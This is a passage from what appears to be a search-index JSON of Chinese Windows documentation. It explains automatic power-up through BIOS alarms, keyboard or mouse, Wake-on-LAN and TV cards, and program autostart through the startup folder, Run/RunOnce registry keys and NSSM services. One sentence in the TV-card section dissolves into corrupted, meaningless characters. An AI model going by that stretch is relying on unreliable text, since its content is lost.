\u4e4b\u540e\u518d\u5c06\u7535\u89c6\u5361\u7684\u53e6\u4e00\u7ec4\u201cPower Switch\u201d\u63a5\u811a\u4e0e\u4e3b\u677f\u4e0a\u7684\u7535\u6e90\u63a5\u811a\u8fde\u63a5\uff0c\u6700\u540e\u628a\u7535\u89c6\u5361\u88c5\u8fdb\u4e3b\u677f\u7684PCI\u6269\u5c55\u69fd\u4e2d\uff0c\u8fd9\u6837\u5185\u90e8\u8fde\u63a5\u5c31\u5b8c\u6210\u4e86\u3002 \u5b89\u88c5\u597d\u786c\u4ef6\u540e\uff0c\u7535\u89c6\u5361\u7684\u914d\u5957\u8f6f\u4ef6\uff08\u5982\u5eb7\u535aPVR2\uff09\u4e5f\u9700\u8981\u8fdb\u884c\u8bbe\u7f6e\u3002\u4e3b\u8981\u662f\u5728\u201c\u9884\u7ea6\u5f55\u50cf\u8bbe\u7f6e\u201d\u529f\u80fd\u65b9\u9762\uff0c\u7528\u6237\u5e94\u52fe\u9009\u201c\u542f\u7528\u81ea\u52a8\u5f00\u673a\u529f\u80fd\u201d\u4e00\u9879\u3002 \u5982\u679c\u4f60\u7535\u8111\u4e2d\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\u8d85\u8fc7\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u7684\u8bdd\uff0c\u8fd8\u8981\u8bbe\u4e3a\u201c\u542f\u7528\u81ea\u52a8\u767b\u5f55\u201d\u6a21\u5f0f\uff0c\u5e76\u8f93\u5165\u7528\u6237\u540d\u79f0\u548c\u5bc6\u7801\uff0c\u5373\u53ef\u5b8c\u6210\u6574\u4e2a\u8bbe\u7f6e\u6b65\u9aa4","title":"Automatic Power Up"},{"location":"windows_development/automatic_power_up/#automatic-power-up","text":"\u81ea\u52a8\u5f00\u673a","title":"Automatic Power Up"},{"location":"windows_development/automatic_power_up/#bios","text":"\u9996\u5148\u5f00\u673a\u540e\u6309\u4f4fDelete\u952e\uff0c\u5c31\u662f\u5e73\u5e38\u5e38\u7528\u7684\u5220\u9664\u6309\u952e(\u89c1\u56fe1)\uff0c\u7136\u540e\u5c31\u4f1a\u8fdb\u5165\u5230BIOS\u754c\u9762\u3002\u867d\u7136\u662f\u4e00\u4e2a\u6ee1\u773cE\u6587\u7684\u84dd\u8272\u4e16\u754c\uff0c\u4f46\u4e0d\u8981\u5bb3\u6015\uff0c\u6ca1\u6709\u95ee\u9898\u7684\u3002 \u5728BIOS\u8bbe\u7f6e\u4e3b\u754c\u9762\u4e2d\u9009\u62e9\u201cPower\u201d\u9009\u9879(\u89c1\u56fe2)\uff0c\u8fdb\u5165\u7535\u6e90\u7ba1\u7406\u7a97\u53e3\u3002\u6709\u4e9b\u673a\u5668\u662f\u5728\u201cPower Management Setup\u201d\u91cc\u9762\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u201cAutomatic Power Up(\u5b9a\u65f6\u5f00\u673a\uff0c\u6709\u4e9b\u673a\u5668\u9009\u9879\u4e3aResume By Alarm)\u201d\u9009\u9879\u662f\u5173\u95ed\u7684\uff0c\u5c06\u5149\u6807\u79fb\u5230\u8be5\u9879(\u89c1\u56fe3)\uff0c\u7528\u201cPagedown\u201d\u952e\u5c06\u201cDisabled\u201d\u6539\u4e3a\u201cEnabled\u201d\u3002 \u6b64\u65f6\u201cAutomatic Power Up\u201d\u9009\u9879\u4f1a\u5f39\u51fa\u4e00\u4e2a\u83dc\u5355\uff0c\u91cc\u9762\u6709\u4e09\u9879\u9009\u62e9\uff1a\u201cDisabled\u3001Every Day\u548cBy Date\u201d(\u89c1\u56fe4)\uff0c\u610f\u601d\u662f\u201c\u7981\u6b62\u3001\u6bcf\u5929\u548c\u6307\u5b9a\u65e5\u671f\u201d\u3002\u5bf9\u4e8e\u4e0a\u73ed\u65cf\u6765\u8bf4\uff0c\u6211\u4eec\u63a8\u8350\u7b2c\u4e8c\u9879\uff0c\u8fd9\u65f6\u4f1a\u8df3\u51fa\u4e00\u4e2a\u65e5\u671f\u548c\u65f6\u95f4\u8bbe\u7f6e\u3002 \u606d\u559c\u60a8\uff0c\u5927\u529f\u5df2\u7ecf\u544a\u6210\u4e00\u534a\u4e86\uff0c\u8fd9\u65f6\u5c06\u5149\u6807\u5148\u79fb\u5230\u201cTime Alarm(\u5f00\u673a\u65f6\u95f4)\u201d\u4e0a\uff0c\u7528\u201cPageup\u201d\u3001\u201cPagedown\u201d\u8bbe\u5b9a\u597d(\u89c1\u56fe5)\u3002 \u5982\u679c\u60a8\u8bbe\u5b9a\u7684\u662f\u5236\u5b9a\u65e5\u671f\uff0c\u5219\u8fd8\u8981\u5728\u201cDate Alarm(\u5f00\u673a\u65e5\u671f)\u201d\u4e0a\u505a\u4e00\u4e2a\u8bbe\u5b9a\u3002\u5f53\u7136\uff0c\u4e0d\u540c\u7684\u4e3b\u677f\u529f\u80fd\u6709\u5dee\u5f02\uff0c\u6709\u7684\u6bcf\u8bbe\u7f6e\u4e00\u6b21\uff0c\u53ea\u80fd\u4f7f\u7528\u4e00\u6b21\uff0c\u800c\u6709\u7684\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u5468\u671f\u3002 \u6700\u540e\u4e00\u6b65\u4e86\uff0c\u8fd9\u56de\u771f\u7684\u8981\u5927\u529f\u544a\u6210\u4e86\uff0c\u5c31\u662f\u9009\u62e9\u201cExit Saving Changes\u201d(\u89c1\u56fe6)\uff0c\u4fdd\u5b58\u5e76\u9000\u51fa\uff0c\u5927\u90e8\u5206\u673a\u5668\u90fd\u6709\u70ed\u952e\uff0c\u4e00\u822c\u90fd\u662fF10\u3002\u63a5\u7740\u673a\u5668\u4f1a\u91cd\u65b0\u542f\u52a8\uff0cOK\uff0c\u606d\u559c\u4f60\uff0c\u4f60\u7684\u673a\u5668\u53ef\u4ee5\u81ea\u52a8\u4e0a\u73ed\u4e86\u3002 \u600e\u4e48\u6837\uff0c\u4f60\u73b0\u5728\u7684\u673a\u5668\u662f\u5426\u53ef\u4ee5\u6bcf\u5929\u81ea\u52a8\u5f00\u5de5\u4e86\u5462\uff0c\u5f53\u7136\u524d\u63d0\u662f\u4f60\u4e5f\u4e0d\u8981\u8fdf\u5230\u5440\uff0c\u5426\u5219\u5c31\u7b97\u5b83\u5f00\u673a\u4e86\u8fd8\u662f\u5728\u90a3\u91cc\u6f2b\u957f\u7684\u7b49\u5f85\uff0c\u522b\u6307\u671b\u5b83\u80fd\u81ea\u5df1\u5e72\u6d3b\u5466\u3002 \u6700\u540e\u63d0\u9192\u5927\u5bb6\u4e00\u53e5\uff0c\u5c31\u662f\u5728\u5468\u672b\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u60f3\u7740\u5173\u95ed\u7535\u6e90\uff0c\u5426\u5219\u5468\u516d\u5b83\u8fd8\u662f\u4f1a\u6309\u65f6\u5f00\u673a\u7684\uff0c\u867d\u7136\u53ef\u4ee5\u518d\u8bbeBIOS\u5173\u95ed\uff0c\u4f46\u603b\u5f52\u6ca1\u6709\u5173\u95ed\u7535\u6e90\u6765\u7684\u5bb9\u6613\uff0c\u60a8\u8bf4\u5462","title":"\u65b9\u6cd5\u4e00\uff1aBIOS"},{"location":"windows_development/automatic_power_up/#keyboard-or-mouse","text":"\u5982\u679c\u7535\u8111\u673a\u7bb1\u653e\u7f6e\u5728\u96be\u4ee5\u89e6\u53ca\u7684\u5730\u65b9\uff0c\u4f7f\u7528\u952e\u76d8/\u9f20\u6807\u5f00\u673a\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u65b9\u6848\u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\u6b64\u529f\u80fd\u53ea\u652f\u6301\u4ee5PS/2\u63a5\u53e3\u8fde\u63a5\u7684\u952e\u76d8\u548c\u9f20\u6807\uff0c\u4f7f\u7528USB\u63a5\u53e3\u8fde\u63a5\u5219\u4e0d\u884c\u3002 \u542f\u7528\u4e3b\u677fBIOS\u4e2d\u201cPower On By PS/2 Keyboard\u201d\u7684\u9009\u9879\uff0c\u5c31\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7684\u5f00\u673a\u70ed\u952e\uff0c\u5982Ctrl+E\u662f\u6700\u5e38\u89c1\u7684\u5f00\u673a\u70ed\u952e\u3002 \u6216\u8005\u9009\u201cPower Key\u201d\u4e00\u9879\u540e\uff0c\u53ef\u7528\u952e\u76d8\u4e0a\u5355\u72ec\u8bbe\u8ba1\u7684\u4e00\u4e2a\u7535\u6e90\u952e\u5f00\u673a\uff0c\u4f46\u524d\u63d0\u662f\u53ea\u6709\u90e8\u5206\u7b26\u5408Keyboard 98\u6280\u672f\u89c4\u683c\u7684\u952e\u76d8\u624d\u652f\u6301\u6b64\u529f\u80fd\u3002\u5f53\u7136\uff0c\u673a\u7bb1\u4e0a\u7684\u7535\u6e90\u6309\u94ae\u4ecd\u7136\u80fd\u591f\u4f7f\u7528\u3002 \u81f3\u4e8e\u7528\u9f20\u6807\u5f00\u673a\u4e5f\u5f88\u7b80\u5355\uff0c\u5728BIOS\u4e2d\u7684\u8bbe\u7f6e\u9009\u9879\u4e0e\u952e\u76d8\u5f00\u673a\u8bbe\u7f6e\u7c7b\u4f3c\uff0c\u7136\u540e\u53ea\u987b\u8f7b\u70b9\u9f20\u6807\u6309\u94ae\u5c31\u80fd\u542f\u52a8\u7535\u8111\u3002","title":"\u65b9\u6cd5\u4e8c\uff1a\u5229\u7528\u952e\u76d8/\u9f20\u6807\u5f00\u673a"},{"location":"windows_development/automatic_power_up/#network","text":"\u8981\u4f7f\u7528Wake On LAN \uff08WOL\uff09\u7f51\u7edc\u5524\u9192\u529f\u80fd\uff0c\u9700\u8981\u7f51\u5361\u652f\u6301\uff0c\u800c\u5177\u5907WOL\u529f\u80fd\u7684\u7f51\u5361\u90fd\u6709\u4e00\u6761\u7279\u6b8a\u7684\u4fe1\u53f7\u7ebf\u8fde\u63a5\u4e3b\u677f\u4e0a\u7684WOL\u63a5\u53e3\uff0c\u8d1f\u8d23\u5c06\u5f00\u673a\u4fe1\u53f7\u4f20\u9001\u81f3\u4e3b\u677f\u3002\u4e0d\u8fc7\uff0c\u76ee\u524d\u5177\u5907WOL\u63a5\u53e3\u7684\u4e3b\u677f\u5df2\u7ecf\u4e0d\u591a\uff0c\u5382\u5546\u6539\u4e3a\u5728\u4e3b\u677f\u5185\u7f6e\u7684\u7f51\u7edc\u82af\u7247\u4e0a\u63d0\u4f9bWOL\u529f\u80fd\u3002 WOL\u7684\u539f\u7406\u662f\u7535\u8111\u5728\u5f00\u673a\u65f6\u6216S5\u4f11\u7720\u6a21\u5f0f\uff08Suspend to Disk\uff0c\u4f11\u7720\u5230\u786c\u76d8\uff09\u4e0b\uff0c\u7f51\u5361\u4ecd\u4ee5\u6781\u4f4e\u7535\u538b\u7ef4\u6301\u57fa\u672c\u8fd0\u4f5c\uff0c\u8fd9\u65f6\u5728\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u7535\u8111\u4fbf\u53ef\u901a\u8fc7\u8f6f\u4ef6\u4f20\u9001\u4e00\u4e2a\u79f0\u4e3a\u201cMagic Packet\u201d\u7684\u795e\u5947\u5c01\u5305\u81f3\u8981\u5524\u9192\u7684\u7535\u8111\u3002 \u7f51\u5361\u63a5\u6536\u4fe1\u53f7\u540e\u5c31\u4f1a\u53d1\u51fa\u5f00\u673a\u4fe1\u53f7\u81f3\u4e3b\u677f\uff0c\u4f7f\u4e3b\u677f\u542f\u52a8\u3002\u7531\u4e8e\u7535\u8111\u5728\u5524\u9192\u524d\u4ecd\u5904\u4e8e\u5f00\u673a\u72b6\u6001\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u77e5\u9053\u7f51\u5361\u7684MAC\u5730\u5740\uff08\u6bcf\u5f20\u7f51\u5361\u5747\u6709\u81ea\u5df1\u72ec\u7279\u7684MAC\u5730\u5740\uff0c\u8f6f\u4ef6\u4ee5\u6b64\u8fdb\u884c\u8bc6\u522b\uff09\u3002 \u7f51\u7edc\u5524\u9192\u529f\u80fd\u7684\u5177\u4f53\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a\u9996\u5148\u5728\u4e3b\u677fBIOS\u4e2d\u6253\u5f00WOL\u9009\u9879\u3002\u6ce8\u610f\u90e8\u4efd\u4e3b\u677f\u53ea\u652f\u6301\u4eceS5\u6a21\u5f0f\u4e2d\u5524\u9192\uff08Wake On LAN from S5\uff09\u3002 \u5176\u6b21\uff0c\u4ece\u7f51\u4e0a\u4e0b\u8f7dWOL\u8f6f\u4ef6\u3002\u8fd9\u4e2a\u540d\u4e3a\u201cMagic packet\u201d\u7684\u7f51\u7edc\u5524\u9192\u8f6f\u4ef6\uff0c\u5176\u8bbe\u7f6e\u548c\u4f7f\u7528\u65b9\u6cd5\u90fd\u5f88\u7b80\u5355\u3002\u8fd0\u884c\u540e\u5728\u5176\u64cd\u4f5c\u754c\u9762\u4e2d\u53ea\u67095\u4e2a\u9009\u9879\u3002 \u5176\u4e2d\uff1a\u7f51\u5361\u7684\u201c\uff08MAC Address\uff09\uff08MAC\u5730\u5740\uff09\u201d\u4e00\u680f\uff0c\u7528\u6237\u53ef\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b\u8f93\u5165\u201cipconfig/all\u201d\u7684\u6307\u4ee4\u6765\u83b7\u5f97\u3002 \u53e6\u5916\uff0c\u201cInternet Address\u201d\uff08\u4e92\u8054\u7f51\u5730\u5740\uff09\u4e00\u680f\u662f\u8981\u8fdb\u884c\u5e7f\u64ad\u7684\u680f\u76ee\uff0c\u5728\u6b64\u680f\u53ca\u201cSubnet Mask\u201d\u4e00\u680f\u4e2d\u8f93\u5165\u201c255\u3001255\u3001255\u3001255\u201d\u5219\u53ef\u8fdb\u884c\u672c\u5730\u5e7f\u64ad\uff08Local Broadcast\uff09\u3002\u7b2c\u56db\u680f\u4e3a\u201cSend Options\u201d\uff0c\u5e94\u9009\u62e9\u201cLocal Subnet\u201d\u3002\u7b2c\u4e94\u680f\u201cRemote Port Number\u201d\u5219\u968f\u610f\u8f93\u5165\u3002 \u6ce8\u610f\uff0c\u4e0a\u8ff0\u8bbe\u7f6e\u53ea\u9488\u5bf9\u672c\u5730\u7f51\u7edc\uff08Local LAN\uff09\u800c\u8a00\u3002\u5982\u8981\u7ecf\u4e92\u8054\u7f51\u8fdb\u884c\u5524\u9192\u5219\u6d89\u53ca\u66f4\u591a\u7684\u95ee\u9898\uff0c\u5728\u6b64\u4e0d\u4f5c\u8ba8\u8bba\u3002\u6700\u540e\u5355\u51fb\u754c\u9762\u4e0b\u65b9\u7684\u201cWake Me UP\u201d\u6309\u94ae\u5373\u53ef\u5b9e\u73b0\u4ece\u7f51\u7edc\u5524\u9192\u7535\u8111\u3002","title":"\u65b9\u6cd5\u4e09\uff1a\u5229\u7528\u7f51\u7edc\u5524\u9192\u5f00\u673a"},{"location":"windows_development/automatic_power_up/#tel-card","text":"\u5177\u5907\u81ea\u52a8\u5f00\u673a\u529f\u80fd\u7684\u7535\u89c6\u5361\u5df2\u7ecf\u5927\u91cf\u9762\u5e02\uff0c\u5c06\u5176\u8fde\u63a5\u597d\u540e\uff0c\u5229\u7528\u7535\u89c6\u5361\u63d0\u4f9b\u7684\u8f6f\u4ef6\u8bbe\u7f6e\u5f00\u673a\u65f6\u95f4\u5373\u53ef\u3002 \u7535\u89c6\u5361\u7684\u81ea\u52a8\u5f00\u673a\u65b9\u5f0f\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u65b9\u5251\u65f1\u8c1d\u6062\u8d28\u94a6\u5b32 \u5f11\u7f38\u8fdc \u03b4\u827f\u725f \u7f5a \u67d8\u5189 \u6d9e\u7f2d\u806a\u54c2\u6c32\u7f21\u6d8c \u91c9\u50ee \u6620\uff1f\u53e6\u4e00\u79cd\u662f\u5229\u7528\u4f11\u7720\u65b9\u5f0f\u5f00\u673a\u7684\u7535\u89c6\u5361\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u7531\u4e8e\u7535\u8111\u5e76\u672a\u771f\u6b63\u5173\u673a\uff0c\u5373\u4ecd\u5728\u6d88\u8017\u7535\u529b\uff0c\u6240\u4ee5\u5e76\u4e0d\u662f\u6240\u6709\u7528\u6237\u90fd\u4e50\u610f\u91c7\u7528\u3002\u4e0b\u9762\u4e3b\u8981\u4ecb\u7ecd\u7b2c\u4e00\u79cd\u81ea\u52a8\u5f00\u673a\u65b9\u6cd5\u7684\u5177\u4f53\u64cd\u4f5c\u3002 \u9996\u5148\uff0c\u7528\u6237\u5728\u5b89\u88c5\u65f6\u8981\u5c06\u673a\u7bb1\u4e0a\u7535\u8111\u5f00\u5173\u6309\u94ae\u7684\u5f15\u7ebf\u63a5\u811a\u4e0e\u7535\u89c6\u5361\u7684\u201cPower Switch\u201d\u63a5\u811a\u76f8\u8fde\u63a5\uff08\u7b14\u8005\u4ee5\u5eb7\u535aX800\u7535\u89c6\u5361\u4e3a\u4f8b\uff09\u3002 \u4e4b\u540e\u518d\u5c06\u7535\u89c6\u5361\u7684\u53e6\u4e00\u7ec4\u201cPower Switch\u201d\u63a5\u811a\u4e0e\u4e3b\u677f\u4e0a\u7684\u7535\u6e90\u63a5\u811a\u8fde\u63a5\uff0c\u6700\u540e\u628a\u7535\u89c6\u5361\u88c5\u8fdb\u4e3b\u677f\u7684PCI\u6269\u5c55\u69fd\u4e2d\uff0c\u8fd9\u6837\u5185\u90e8\u8fde\u63a5\u5c31\u5b8c\u6210\u4e86\u3002 \u5b89\u88c5\u597d\u786c\u4ef6\u540e\uff0c\u7535\u89c6\u5361\u7684\u914d\u5957\u8f6f\u4ef6\uff08\u5982\u5eb7\u535aPVR2\uff09\u4e5f\u9700\u8981\u8fdb\u884c\u8bbe\u7f6e\u3002\u4e3b\u8981\u662f\u5728\u201c\u9884\u7ea6\u5f55\u50cf\u8bbe\u7f6e\u201d\u529f\u80fd\u65b9\u9762\uff0c\u7528\u6237\u5e94\u52fe\u9009\u201c\u542f\u7528\u81ea\u52a8\u5f00\u673a\u529f\u80fd\u201d\u4e00\u9879\u3002 \u5982\u679c\u4f60\u7535\u8111\u4e2d\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\u8d85\u8fc7\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u7684\u8bdd\uff0c\u8fd8\u8981\u8bbe\u4e3a\u201c\u542f\u7528\u81ea\u52a8\u767b\u5f55\u201d\u6a21\u5f0f\uff0c\u5e76\u8f93\u5165\u7528\u6237\u540d\u79f0\u548c\u5bc6\u7801\uff0c\u5373\u53ef\u5b8c\u6210\u6574\u4e2a\u8bbe\u7f6e\u6b65\u9aa4","title":"\u65b9\u6cd5\u56db\uff1a\u7528\u7535\u89c6\u5361\u5f00\u673a"},{"location":"windows_development/autostart/","text":"\u5f00\u673a\u542f\u52a8 \uf0c1 Windows \u8bbe\u7f6e\u7a0b\u5e8f\u5f00\u673a\u542f\u52a8 \u8ba1\u5212\u4efb\u52a1 \uf0c1 \u9762\u5411\u5f00\u53d1\u4eba\u5458\u7684\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f \u5f00\u673a\u542f\u52a8\u6587\u4ef6\u5939 \uf0c1 \u5728\u6587\u4ef6\u7ba1\u7406\u7684\u5730\u5740\u680f\u4e2d\u7c98\u8d34 %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u7136\u540e\u56de\u8f66\u3002 \u6216\u8005\uff0c\u5728\u8f83\u65b0\u7248\u672c\u7684 Windows \u4e2d\uff0c\u4ece\u8fd0\u884c\u547d\u4ee4 ( Win+R ) \u6253\u5f00 shell:startup \u3002 \u53f3\u952e\u5355\u51fb\u6587\u4ef6\u5939\u4e2d\u7684\u7a7a\u767d\u533a\u57df\u5e76\u9009\u62e9\u201c\u65b0\u5efa\u201d\uff0c\u7136\u540e\u9009\u62e9\u201c\u5feb\u6377\u65b9\u5f0f\u201d\u3002 \u5728\u201c\u8bf7\u952e\u5165\u5bf9\u8c61\u7684\u4f4d\u7f6e(T):\u201d\u4e2d\u8f93\u5165\u8def\u5f84(\u4f8b\u5982 C:\\syncthing\\syncthing.exe --no-console --no-browser )\u3002 \u70b9\u51fb\u201c\u4e0b\u4e00\u6b65\u201d\u3002 \u70b9\u51fb\u201c\u5b8c\u6210\u201d\u3002 \u6ce8\u518c\u8868 \uf0c1 \u4f7f\u7528 Run \u6216 RunOnce \u6ce8\u518c\u8868\u9879\u4f7f\u7a0b\u5e8f\u5728\u7528\u6237\u767b\u5f55\u65f6\u8fd0\u884c\u3002 \u6bcf\u6b21\u7528\u6237\u767b\u5f55\u65f6\uff0c\u8be5 Run \u5bc6\u94a5\u90fd\u4f1a\u4f7f\u7a0b\u5e8f\u8fd0\u884c\uff0c\u800c RunOnce \u5bc6\u94a5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u4e00\u6b21\uff0c\u7136\u540e\u5220\u9664\u8be5\u5bc6\u94a5\u3002 \u53ef\u4ee5\u4e3a\u7528\u6237\u6216\u8ba1\u7b97\u673a\u8bbe\u7f6e\u8fd9\u4e9b\u5bc6\u94a5\u3002 \u952e\u7684\u6570\u636e\u503c\u662f\u547d\u4ee4\u884c\u4e0d\u8d85\u8fc7 260 \u4e2a\u5b57\u7b26\u3002 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Run and RunOnce registry keys \u4f5c\u4e3a\u72ec\u7acb\u4e8e\u7528\u6237\u767b\u5f55\u7684\u670d\u52a1\u8fd0\u884c \uf0c1 \u521b\u5efa\u4e00\u4e2a\u5728 Windows \u542f\u52a8\u540e\u7acb\u5373\u8fd0\u884c\u7684\u670d\u52a1\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u201c\u975e\u5438\u542e\u670d\u52a1\u7ba1\u7406\u5668\u201d NSSM \u6765\u5b9e\u73b0\u3002 nssm install servername //\u521b\u5efaservername\u670d\u52a1\uff0c\u5f39\u51fa\u914d\u7f6e\u754c\u9762 nssm start servername //\u542f\u52a8\u670d\u52a1 nssm stop servername //\u6682\u505c\u670d\u52a1 nssm restart servername //\u91cd\u65b0\u542f\u52a8\u670d\u52a1 nssm remove servername //\u5220\u9664\u521b\u5efa\u7684servername\u670d\u52a1 nssm edit servername//\u66f4\u6539servername\u670d\u52a1\uff0c\u5f39\u51fa\u4fee\u6539\u754c\u9762 nssm set servername \u53c2\u6570\u540d \u53c2\u6570\u503c //\u8bbe\u7f6e\u670d\u52a1\u53c2\u6570\u503c sc start servername //\u542f\u52a8\u670d\u52a1\u547d\u4ee4 sc delete servername//windows\u5220\u9664\u670d\u52a1\u547d\u4ee4 \u76f4\u63a5\u4f7f\u7528windows\u7684\u670d\u52a1\u7ba1\u7406\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u7684\u64cd\u4f5c\uff0c\u670d\u52a1\u53f3\u952e\u5c5e\u6027 - \u6062\u590d\u5373\u53ef\u8bbe\u7f6e\u670d\u52a1\u6302\u6389\u91cd\u542f\u7b49\u5185\u5bb9\u3002 \u793a\u4f8b \u4e0b\u8f7d nssm \u5e76\u5c06\u5176\u89e3\u538b\u7f29\u5230\u6587\u4ef6\u5939\u4e2d\u3002 \u4ece\u7ba1\u7406\u5458\u8fd0\u884c\u547d\u4ee4\u63d0\u793a\u7b26\uff0cCD\u5230NSSM\u6587\u4ef6\u5939\u4e2d\u5e76\u8fd0\u884c\u547d\u4ee4 nssm.exe install \u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177 \uf0c1 \u6709\u8bb8\u591a\u7b2c\u4e09\u65b9\u5b9e\u7528\u7a0b\u5e8f\u65e8\u5728\u5e2e\u52a9\u66f4\u8f7b\u677e\u5730\u5b89\u88c5\u548c\u8fd0\u884c\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u901a\u5e38\u63d0\u4f9b\u4e00\u4e2a\u5b89\u88c5\u7a0b\u5e8f\u3001\u4e00\u4e2a\u81ea\u52a8\u542f\u52a8\u7a0b\u5e8f\u7684\u9009\u9879\uff0c\u4ee5\u53ca\u66f4\u7cbe\u81f4\u7684\u7528\u6237\u4f53\u9a8c\u3002","title":"\u5f00\u673a\u542f\u52a8 {#autostart}"},{"location":"windows_development/autostart/#autostart","text":"Windows \u8bbe\u7f6e\u7a0b\u5e8f\u5f00\u673a\u542f\u52a8","title":"\u5f00\u673a\u542f\u52a8"},{"location":"windows_development/autostart/#task-scheduler","text":"\u9762\u5411\u5f00\u53d1\u4eba\u5458\u7684\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"windows_development/autostart/#startup-folder","text":"\u5728\u6587\u4ef6\u7ba1\u7406\u7684\u5730\u5740\u680f\u4e2d\u7c98\u8d34 %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u7136\u540e\u56de\u8f66\u3002 \u6216\u8005\uff0c\u5728\u8f83\u65b0\u7248\u672c\u7684 Windows \u4e2d\uff0c\u4ece\u8fd0\u884c\u547d\u4ee4 ( Win+R ) \u6253\u5f00 shell:startup \u3002 \u53f3\u952e\u5355\u51fb\u6587\u4ef6\u5939\u4e2d\u7684\u7a7a\u767d\u533a\u57df\u5e76\u9009\u62e9\u201c\u65b0\u5efa\u201d\uff0c\u7136\u540e\u9009\u62e9\u201c\u5feb\u6377\u65b9\u5f0f\u201d\u3002 \u5728\u201c\u8bf7\u952e\u5165\u5bf9\u8c61\u7684\u4f4d\u7f6e(T):\u201d\u4e2d\u8f93\u5165\u8def\u5f84(\u4f8b\u5982 C:\\syncthing\\syncthing.exe --no-console --no-browser )\u3002 \u70b9\u51fb\u201c\u4e0b\u4e00\u6b65\u201d\u3002 \u70b9\u51fb\u201c\u5b8c\u6210\u201d\u3002","title":"\u5f00\u673a\u542f\u52a8\u6587\u4ef6\u5939"},{"location":"windows_development/autostart/#regedit","text":"\u4f7f\u7528 Run \u6216 RunOnce \u6ce8\u518c\u8868\u9879\u4f7f\u7a0b\u5e8f\u5728\u7528\u6237\u767b\u5f55\u65f6\u8fd0\u884c\u3002 \u6bcf\u6b21\u7528\u6237\u767b\u5f55\u65f6\uff0c\u8be5 Run \u5bc6\u94a5\u90fd\u4f1a\u4f7f\u7a0b\u5e8f\u8fd0\u884c\uff0c\u800c RunOnce \u5bc6\u94a5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u4e00\u6b21\uff0c\u7136\u540e\u5220\u9664\u8be5\u5bc6\u94a5\u3002 \u53ef\u4ee5\u4e3a\u7528\u6237\u6216\u8ba1\u7b97\u673a\u8bbe\u7f6e\u8fd9\u4e9b\u5bc6\u94a5\u3002 \u952e\u7684\u6570\u636e\u503c\u662f\u547d\u4ee4\u884c\u4e0d\u8d85\u8fc7 260 \u4e2a\u5b57\u7b26\u3002 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Run and RunOnce registry keys","title":"\u6ce8\u518c\u8868"},{"location":"windows_development/autostart/#service","text":"\u521b\u5efa\u4e00\u4e2a\u5728 Windows \u542f\u52a8\u540e\u7acb\u5373\u8fd0\u884c\u7684\u670d\u52a1\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u201c\u975e\u5438\u542e\u670d\u52a1\u7ba1\u7406\u5668\u201d NSSM \u6765\u5b9e\u73b0\u3002 nssm install servername //\u521b\u5efaservername\u670d\u52a1\uff0c\u5f39\u51fa\u914d\u7f6e\u754c\u9762 nssm start servername //\u542f\u52a8\u670d\u52a1 nssm stop servername //\u6682\u505c\u670d\u52a1 nssm restart servername //\u91cd\u65b0\u542f\u52a8\u670d\u52a1 nssm remove servername //\u5220\u9664\u521b\u5efa\u7684servername\u670d\u52a1 nssm edit servername//\u66f4\u6539servername\u670d\u52a1\uff0c\u5f39\u51fa\u4fee\u6539\u754c\u9762 nssm set servername \u53c2\u6570\u540d \u53c2\u6570\u503c //\u8bbe\u7f6e\u670d\u52a1\u53c2\u6570\u503c sc start servername //\u542f\u52a8\u670d\u52a1\u547d\u4ee4 sc delete servername//windows\u5220\u9664\u670d\u52a1\u547d\u4ee4 \u76f4\u63a5\u4f7f\u7528windows\u7684\u670d\u52a1\u7ba1\u7406\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u7684\u64cd\u4f5c\uff0c\u670d\u52a1\u53f3\u952e\u5c5e\u6027 - \u6062\u590d\u5373\u53ef\u8bbe\u7f6e\u670d\u52a1\u6302\u6389\u91cd\u542f\u7b49\u5185\u5bb9\u3002 \u793a\u4f8b \u4e0b\u8f7d nssm \u5e76\u5c06\u5176\u89e3\u538b\u7f29\u5230\u6587\u4ef6\u5939\u4e2d\u3002 \u4ece\u7ba1\u7406\u5458\u8fd0\u884c\u547d\u4ee4\u63d0\u793a\u7b26\uff0cCD\u5230NSSM\u6587\u4ef6\u5939\u4e2d\u5e76\u8fd0\u884c\u547d\u4ee4 nssm.exe 